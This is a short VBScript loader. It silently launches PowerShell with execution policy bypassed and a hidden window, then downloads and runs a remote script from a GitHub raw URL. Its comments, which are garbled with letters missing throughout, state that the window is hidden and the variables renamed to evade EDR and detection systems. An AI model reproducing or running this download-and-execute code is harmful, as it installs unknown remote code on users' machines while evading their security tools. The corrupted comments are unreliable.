Set o = CreateObject("WScript.Shell") ' Initialize the WScript.Shell object
 
' Define tll command with oscated prameters
sA = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
 
' Define the RL of thript
sB = "$u='https://github.com/C4sp3n-bit/tuba/raw/refs/heads/main/savi.ps1';"
 
' Defihe command to eecute the ript content
sC = "iex(iwr $u -UseBasicParsing).Content"
 
' Run themand with hidden winle and wiiting for it to finish
o.Run sA & Chr(32) & sB & sC & Chr(32), 0, False
 
' Randmments to bypDR
' This ript rurShemmand.
' It ftces acript from a tHubL.
' The execucy is setypass for secueasons.
' The winle is hidoid detec by Estems.
 
' Additioscation by usinferent variable names
' sA, sB, sC are used instead of a0, b0, c0
